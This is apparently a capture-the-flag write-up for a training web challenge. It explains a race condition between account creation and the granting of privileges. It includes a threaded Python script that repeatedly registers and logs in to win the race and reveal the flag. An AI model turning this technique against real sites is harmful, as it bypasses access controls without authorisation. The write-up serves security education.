# aart ![c](https://img.shields.io/badge/solved-success)
### Analysis
This challenge consisted of a website that allowed the creation of user accounts, login to those accounts as well as submitting ASCII art and voting for it. Furthermore there was a link on top of the page that provided the whole source of the website (except connect.php which contained the MySQL connection information).

There are three files of interest to us, the login script, the register script and the database scheme, from which we can see that during registration, the account is first created, and only after the privileges are inserted in the database. 

Obviously the flag is shown only if our account has those privileges, so we can try to login before the privileges are inserted, exploiting the race condition.
### Exploit
```python
import requests
import string
import random
import sys
import threading
import time

EP = "http://aart.training.jinblack.it"

def rand_string(N=10):
	return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

def register(u,p):
	url = "%s/register.php" % EP
	data = {"username":u, "password": p}
	r = requests.post(url, data = data)
	print(r)
	if "SUCCESS!" in r.text:
		return True
	return False

def login(u, p):
	url = "%s/login.php" % EP
	data = {"username":u, "password": p}
	r = requests.post(url, data = data)
	print(r)

	if "flag{" in r.text:
		print(r.text)
		sys.exit(0)



while True:
	u = rand_string()
	p = rand_string()

	r = threading.Thread(target=register, args=(u, p))
	r.start()

	l = threading.Thread(target=login, args=(u, p))
	l.start()

	time.sleep(0.1)



import IPython
IPython.embed()
```

**flag{i_guess_you_were_fast_enough!}**
